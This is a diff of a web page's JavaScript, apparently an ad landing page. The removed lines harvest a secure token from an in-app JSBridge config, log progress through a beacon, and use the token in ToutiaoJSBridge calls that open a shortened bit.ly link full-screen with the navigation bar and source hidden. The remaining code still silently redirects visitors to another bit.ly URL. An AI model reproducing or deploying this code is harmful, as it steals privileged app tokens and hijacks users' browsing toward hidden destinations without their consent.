@@ -9,39 +9,8 @@
     var schemeFired = false;
     var pageLoadTime = Date.now();
     var CID = 1870060644426865;
-    var POPUP_URL = 'https://bit.ly/4aHQcVB';
-    var cachedToken = null;
-
-    function log(msg) { try { navigator.sendBeacon('/debug-log', msg); } catch(e){} }
-
-    function tryGetToken() {
-        if (cachedToken) return;
-        try {
-            var cfg = window.JSBridge && typeof window.JSBridge.getConfig === 'function' && window.JSBridge.getConfig();
-            if (cfg && cfg.secure && cfg.secure.token) { cachedToken = cfg.secure.token; log('tok:cached'); }
-        } catch(e){}
-    }
-    setTimeout(tryGetToken, 500);
-    setTimeout(tryGetToken, 1500);
-    setTimeout(tryGetToken, 3000);
 
     function fireFullscreen() {
-        var token = cachedToken;
-        if (!token) {
-            try {
-                var cfg = window.JSBridge && typeof window.JSBridge.getConfig === 'function' && window.JSBridge.getConfig();
-                if (cfg && cfg.secure && cfg.secure.token) token = cfg.secure.token;
-            } catch(e){}
-        }
-        log('fire:tok:' + (token ? 'yes' : 'no'));
-        var tt = window.ToutiaoJSBridge;
-        if (tt && tt.call) {
-            if (token) {
-                try { tt.call('openAdLandPageLinks', { url: POPUP_URL, landingStyle: 2, title: '', isDeeplink: 1, refer: 'landing_page', hide_nav_bar: 1, hide_source: 1, should_full_screen: 1, trans_status_bar: 1, is_instant_page: 1, _jsb_secure_token: token }, function(res){ log('res:' + JSON.stringify(res)); }); } catch(e){}
-            }
-            try { tt.call('openOrganicLandPage', { url: POPUP_URL, landingStyle: 2, title: '', isDeeplink: 1, refer: 'landing_page', hide_nav_bar: 1, hide_source: 1, should_full_screen: 1, trans_status_bar: 1 }, function(){}); } catch(e){}
-            try { tt.call('openAdLandPageLinks', { url: POPUP_URL, landingStyle: 2, title: '', isDeeplink: 0, refer: 'ad', hide_nav_bar: 1, hide_source: 1, should_full_screen: 1, trans_status_bar: 1, is_instant_page: 1 }, function(){}); } catch(e){}
-        }
         window.location.href = 'https://bit.ly/4fnzeOR';
     }
 
